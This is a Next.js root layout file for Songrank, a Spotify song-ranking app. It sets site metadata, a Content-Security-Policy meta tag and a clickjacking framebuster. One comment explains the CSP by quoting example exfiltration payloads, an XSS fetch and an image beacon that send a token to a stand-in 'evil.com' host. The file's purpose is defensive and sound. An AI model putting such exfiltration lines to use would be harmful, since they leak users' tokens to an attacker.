import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
  display: "swap",
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
  display: "swap",
});

// Note: basePath / Pages URL is still `/bracketeering` because the repo
// hasn't been renamed yet — the OAuth redirect URI registered in each
// user's Spotify dev app points at /bracketeering/callback/. Renaming
// the repo requires every existing user to add a new redirect URI on
// their dev app, so the deploy path is sticky even though the brand
// has changed.
const SITE_URL = "https://jhomer192.github.io/bracketeering";
const TITLE = "Songrank — Vote your way to your real top 10";
const DESCRIPTION =
  'Vote "this or that" on 128 of your songs. Walk away with a ranked top 10 — and a Spotify playlist that proves it.';

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: { default: TITLE, template: "%s · Songrank" },
  description: DESCRIPTION,
  applicationName: "Songrank",
  authors: [{ name: "Jack Homer" }],
  keywords: [
    "Spotify",
    "music ranking",
    "top songs",
    "playlist",
    "tournament bracket",
    "music discovery",
  ],
  openGraph: {
    type: "website",
    url: SITE_URL,
    siteName: "Songrank",
    title: TITLE,
    description: DESCRIPTION,
  },
  twitter: {
    card: "summary_large_image",
    title: TITLE,
    description: DESCRIPTION,
  },
  robots: { index: true, follow: true },
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  // No `maximumScale` — pinch-zoom is an a11y need (low-vision users) and
  // the bracket UX has no real motive to lock it. Past iOS bugs that made
  // double-tap-to-zoom interfere with rapid taps are no longer relevant
  // on modern viewports.
  // Match brand bg so the iOS status bar / Android URL bar tint into the app.
  themeColor: "#09090b",
  colorScheme: "dark",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    // `data-theme="dark"` + `color-scheme: dark` keeps native form controls
    // (selects, scrollbars) in dark mode regardless of the user's OS pref.
    // Songrank is intentionally dark-only — see globals.css comment.
    <html
      lang="en"
      data-theme="dark"
      style={{ colorScheme: "dark" }}
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <head>
        {/* Security posture for a GitHub-Pages static SPA — no HTTP headers
            available, so the meaningful pieces live in <meta> + a tiny
            framebuster.
              - CSP via meta has real teeth on connect-src, img-src, and
                media-src: an XSS injecting `fetch("https://evil.com")` is
                blocked, an `<img src="//evil.com/log?token=...">` is
                blocked, and exfil-via-<audio> is blocked.
              - script-src needs 'unsafe-inline' because Next.js's static
                export inlines hashed bootstrap scripts with no nonce.
                No off-origin scripts are loaded.
              - frame-ancestors is IGNORED in meta (CSP3 mandates HTTP
                header only). Clickjacking protection is enforced below
                via the inline framebuster.
              - referrer policy: don't leak the OAuth ?code= or ?state=
                back to upstream sites if a user middle-clicks a link. */}
        <meta
          httpEquiv="Content-Security-Policy"
          content={[
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' https://i.scdn.co https://mosaic.scdn.co data: blob:",
            "font-src 'self' data:",
            // connect-src:
            //   - api.spotify.com / accounts.spotify.com — OAuth + data
            //   - itunes.apple.com — preview URL resolution. Spotify's own
            //     `preview_url` was deprecated late 2024 (mostly null), and
            //     their iframe embed API has unfixable mobile gesture bugs,
            //     so we resolve previews via iTunes Search and play the
            //     m4a directly. See src/lib/preview.ts for the long story.
            "connect-src 'self' https://api.spotify.com https://accounts.spotify.com https://itunes.apple.com",
            // media-src for the <audio> element playing iTunes previews.
            // Apple serves preview audio off audio-ssl.itunes.apple.com.
            "media-src 'self' https://audio-ssl.itunes.apple.com blob:",
            // OAuth redirect uses `window.location.href` (navigation), not a
            // <form> submit — `form-action 'self'` is enough; no need to
            // allow accounts.spotify.com here.
            "form-action 'self'",
            "base-uri 'self'",
            "object-src 'none'",
          ].join("; ")}
        />
        <meta name="referrer" content="strict-origin-when-cross-origin" />
        {/* JS framebuster — replaces the missing X-Frame-Options. If the page
            is being framed by a different origin, redirect the top frame to
            our URL so the embedding site loses control. The cross-origin
            `top.location` read deliberately throws on hostile frames; we
            catch and force the redirect via `top = self`. */}
        <script
          // eslint-disable-next-line react/no-danger
          dangerouslySetInnerHTML={{
            __html:
              "try{if(self!==top){top.location=self.location}}catch(e){top.location=self.location}",
          }}
        />
      </head>
      <body className="min-h-full flex flex-col bg-[var(--bg)] text-[var(--fg)]">
        {children}
      </body>
    </html>
  );
}
